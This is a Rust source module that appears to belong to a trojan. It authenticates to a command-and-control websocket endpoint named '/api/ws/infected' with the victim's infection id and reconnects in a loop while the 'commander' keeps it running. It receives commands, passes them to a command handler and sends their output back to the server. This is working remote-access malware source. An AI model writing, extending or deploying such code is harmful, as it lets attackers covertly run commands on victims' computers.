mod payloads;
mod handlers;

use std::{
    sync::{LazyLock, Mutex}, time::Duration
};

use anyhow::Result;
use payloads::general::StringPayload;

use futures_util::{SinkExt, StreamExt, stream::SplitSink};
use tokio::{net::TcpStream, time::interval};
use tokio_tungstenite::{
    MaybeTlsStream, WebSocketStream, connect_async, tungstenite::{Message, handshake::client::generate_key, http::Request}
};

use crate::{
    constants::compiled::{self, WS_COMMANDER_RECONNECT, WS_URL},
    storage::STORAGE,
    websockets::{handlers::{handle_command, handle_goodbye}, payloads::{Payload, SimccMessage}},
};

type WsSink = SplitSink<WebSocketStream<MaybeTlsStream<TcpStream>>, Message>;

static RUNNING: LazyLock<Mutex<bool>> = LazyLock::new(|| Mutex::new(true));

pub async fn start_ws_loop() -> Result<()> {
    // Construct a request with the `iid` set for authentication
    let req = Request::builder()
        .uri(WS_URL("/api/ws/infected"))
        .header(
            "Authorization",
            format!("Bearer {}", {
                STORAGE.lock().unwrap().iid.clone().unwrap()
            }),
        )
        .header("Host", compiled::HOST)
        .header("Connection", "Upgrade")
        .header("Upgrade", "websocket")
        .header("Sec-WebSocket-Version", "13")
        .header("Sec-WebSocket-Key", generate_key())
        .body(())
        .unwrap();

    // Loop as long as the commander didn't shut down the trojan
    while {
        let running = *RUNNING.lock().unwrap();
        running
    } {
        let mut ws: Option<_> = Option::None;

        let mut interval = interval(Duration::from_millis(WS_COMMANDER_RECONNECT));

        // try reconnecting in the case of the connection being closed
        while ws.is_none() {
            match connect_async(req.clone()).await {
                Ok(res) => ws = Some(res.0),
                Err(e) => println!("Failed to connect to websocket-server: {}", e),
            }
            interval.tick().await;
        }

        let (mut sink, mut src) = ws.unwrap().split();

        println!("Connected to {}!", WS_URL(""));

        sink.send(
            payloads::SimccMessage::builder()
                .payload(payloads::Payload::Hello(
                    StringPayload::builder()
                        .content(String::from("Hello from rust!"))
                        .build(),
                ))
                .build()
                .try_into()?,
        )
        .await
        .expect("Failed to send hello-packet!");

        while let Some(msg) = src.next().await {
            match msg {
                Ok(Message::Text(text)) => {
                    println!("{}", text);
                    if let Err(e) = handle_generic_message(&text, &mut sink).await {
                        eprintln!("Failed to handle message: {}", e);
                    }
                }
                Ok(Message::Close(_)) => {
                    println!("Server closed connection");
                    break;
                }
                Err(e) => {
                    eprintln!("Error: {}", e);
                    break;
                }
                _ => {}
            }
        }
    }

    Ok(())
}

async fn handle_generic_message(
    text: &str,
    sink: &mut WsSink,
) -> Result<()> {
    let req = serde_json::from_str::<SimccMessage>(text).unwrap();

    // non-awaitable
    match req.payload {
        Payload::Err(err) => {
            let msg = match err.msg {
                Some(val) => val,
                None => String::from("-")
            };
            println!("Got error from backend: type {}, {}", err.err_type, msg);
        }
        Payload::Goodbye(payload) => handle_goodbye(payload),

        // send off for awaitables
        awaitable => handle_awaited_messages(awaitable, sink).await ?,
    }

    Ok(())
}

async fn handle_awaited_messages(
    payload: Payload,
    sink: &mut WsSink,
) -> Result<()> {

    let reply = match payload {
        Payload::Command(command) => Some(
            Payload::CommandOutput(handle_command(command))
        ),
        _ => None
    };

    if reply.is_none() {
        anyhow::anyhow!("Unknown payload recieved from server!");
    }

    sink.send(
        payloads::SimccMessage::builder()
            .payload(reply.unwrap())
            .build()
            .try_into()?,
    )
    .await?;

    Ok(())
}
